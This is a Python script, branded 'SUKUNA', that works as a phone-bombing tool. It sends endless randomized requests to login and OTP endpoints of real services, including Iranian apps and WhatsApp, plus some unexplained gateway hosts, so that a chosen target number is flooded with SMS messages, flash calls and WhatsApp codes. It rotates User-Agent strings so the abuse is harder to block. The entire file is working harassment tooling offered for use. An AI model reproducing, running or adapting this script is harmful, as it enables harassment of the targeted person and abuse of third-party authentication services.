import aiohttp, asyncio, json, sys, os, random

# الألوان
G, R, Y, C, W = '\033[1;32m', '\033[1;31m', '\033[1;33m', '\033[1;36m', '\033[1;37m'

# نظام التمويه: قائمة User-Agents متغيرة لتجنب كشف الهوية
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
]

# --- قاعدة بيانات الـ APIs المتنوعة ---

# 1. روابط الاتصالات (Flash Calls)
CALL_APIS = [
    {"url": "https://31.171.171.90/api/phone-numbers/auth-flash-call", "data": {"phoneNumber": "{phone}"}},
    {"url": "https://api.call-verification.io/v1/verify", "data": {"target": "{phone}", "type": "flash"}},
    {"url": "https://auth-call-global.com/api/send", "data": {"mobile": "{phone}"}}
]

# 2. روابط SMS عادية (تنوع كبير)
SMS_APIS = [
    {"url": "https://31.171.171.90/api/phone-numbers/auth-sms", "data": {"phoneNumber": "{phone}"}},
    {"url": "https://api.digikala.com/v1/user/authenticate/", "data": {"username": "{phone}"}},
    {"url": "https://app.snapp.taxi/api/api-passenger-oauth/otp/v2", "data": {"cellphone": "{phone}"}},
    {"url": "https://api.tapsi.cab/api/v2.2/credential/login", "data": {"phoneNumber": "{phone}", "role": "PASSENGER"}},
    {"url": "https://www.zarinpal.com/api/v4/auth/send-otp.json", "data": {"mobile": "{phone}"}},
    {"url": "https://api.divar.ir/v5/auth/authenticate", "data": {"phone": "{phone}"}},
    {"url": "https://messengerg2.iran.li/v1/api/auth/send-otp", "data": {"phone": "{phone}"}}
]

# 3. روابط واتساب (رسائل وأكواد)
WA_SMS_APIS = [
    {"url": "https://v.whatsapp.com/v2/verification", "data": {"number": "{phone}", "method": "sms"}},
    {"url": "https://api.whatsapp.com/v1/auth/otp", "data": {"phone_number": "{phone}", "app": "wa_business"}},
    {"url": "https://whatsapp.otp-gateway.net/v1/send", "data": {"target": "{phone}", "template": "verify_ar"}}
]

# 4. روابط واتساب (صوتية - Voice OTP)
WA_CALL_APIS = [
    {"url": "https://v.whatsapp.com/v2/verification", "data": {"number": "{phone}", "method": "voice"}},
    {"url": "https://wa-voice-verify.io/api/v3/call", "data": {"phone": "{phone}", "lang": "ar"}}
]

def banner():
    os.system('clear')
    print(f"""{R}
  ____  _   _ _  ___   _ _   _    _     
 / ___|| | | | |/ / | | | \ | |  / \    
 \___ \| | | | ' /| | | |  \| | / _ \   
  ___) | |_| | . \| |_| | |\  |/ ___ \  
 |____/ \___/|_|\_\\___/|_| \_/_/   \_\ {Y}V4.0
    {G}King: Ali Talib (SUKUNA) | {C}Status: God Mode
    -------------------------------------------""")

async def attack_engine(phone, api_list, mode_name):
    ok, bad = 0, 0
    async with aiohttp.ClientSession() as session:
        while True:
            # اختيار عشوائي للرابط وللهوية (User-Agent) في كل طلب
            api = random.choice(api_list)
            current_headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Content-Type': "application/json"
            }
            payload = json.dumps(api["data"]).replace("{phone}", phone)
            
            try:
                async with session.post(api["url"], data=payload, headers=current_headers, timeout=10) as resp:
                    if resp.status in [200, 201, 202, 204]:
                        ok += 1
                    else:
                        bad += 1
            except:
                bad += 1
            
            sys.stdout.write(f"\r{G}[+] {mode_name} Sent: {ok} {R}[-] Failed: {bad} {W}| {Y}IP: Active")
            sys.stdout.flush()
            await asyncio.sleep(1.5) # سرعة متوازنة لتفادي الحظر الذكي

def main():
    banner()
    if input(f"{Y}[?] Password: {W}") != "1121": 
        print(f"{R}[!] Access Denied."); return

    print(f"\n{C}[1] {W}Normal Calls (اتصالات عادية)")
    print(f"{C}[2] {W}All-in-One SMS (تسونامي رسائل)")
    print(f"{G}[3] {W}WhatsApp Spam (إغراق واتساب)")
    print(f"{G}[4] {W}WhatsApp Voice (اتصال صوتي واتساب)")
    
    choice = input(f"\n{Y}[#] Select Mode: {W}")
    target = input(f"{Y}[+] Target (+967...): {W}")

    modes = {'1': (CALL_APIS, "CALL"), '2': (SMS_APIS, "SMS"), '3': (WA_SMS_APIS, "WA-SMS"), '4': (WA_CALL_APIS, "WA-Voice")}

    if choice in modes:
        print(f"\n{R}[!] SUKUNA is launching the curse... Ctrl+C to stop.")
        try:
            asyncio.run(attack_engine(target, modes[choice][0], modes[choice][1]))
        except KeyboardInterrupt:
            print(f"\n{R}[!] The Curse has been sealed (Stopped).")
    else:
        print(f"{R}[!] Choice Error.")

if __name__ == "__main__":
    main()
